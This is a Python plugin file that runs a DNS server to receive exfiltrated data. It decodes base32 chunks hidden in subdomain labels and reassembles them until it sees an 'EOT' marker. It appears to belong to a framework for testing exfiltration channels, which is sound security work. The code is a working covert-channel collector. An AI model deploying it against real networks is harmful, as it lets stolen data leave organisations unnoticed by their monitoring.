from __future__ import annotations
from typing import Dict, Any, Iterable, Iterator
from dnslib.server import DNSServer, BaseResolver, DNSLogger
import threading, queue
from tfg.plugins.api import ExfilServerPlugin

class _Collector:
    def __init__(self, exfil_id: str):
        self.id = exfil_id
        self.buf = bytearray()
        self.q: "queue.Queue[bytes]" = queue.Queue()
        self.done = threading.Event()

    def put_label(self, label: str):
        if label.upper() == "EOT":
            self.q.put(bytes(self.buf)); self.buf.clear(); self.done.set(); self.q.put(b""); return
        # base32 padding repair
        lab = label.replace(".", "")
        pad = "=" * ((8 - len(lab) % 8) % 8)
        try:
            import base64
            decoded = base64.b32decode(lab.upper() + pad)
            self.buf += decoded
        except Exception:
            pass

    def iter(self) -> Iterator[bytes]:
        while True:
            x = self.q.get()
            if x == b"" and self.done.is_set():
                break
            if x:
                yield x

class _Resolver(BaseResolver):
    def __init__(self, exfil_id: str, collector: _Collector):
        self.exfil_id = exfil_id; self.col = collector
    def resolve(self, request, handler):
        qname = str(request.q.qname).strip("."); parts = qname.split(".")
        if len(parts) >= 2 and parts[1] == self.exfil_id:
            self.col.put_label(parts[0])
        reply = request.reply(); return reply

class DnsServerSubdomain(ExfilServerPlugin):
    canal = "DNS"
    metodo = 1
    name = "dns_server_subdomain"

    def run(self, config: Dict[str, Any]) -> Iterable[bytes]:
        bind = config.get("bind_host") or "0.0.0.0"; port = int(config.get("bind_port") or 53)
        exfil_id = config.get("exfil_id") or "tfg"
        col = _Collector(exfil_id); resolver = _Resolver(exfil_id, col); logger = DNSLogger("recv", False)
        srv = DNSServer(resolver, port=port, address=bind, logger=logger)
        t = threading.Thread(target=srv.start_thread, daemon=True); t.start()
        return col.iter()
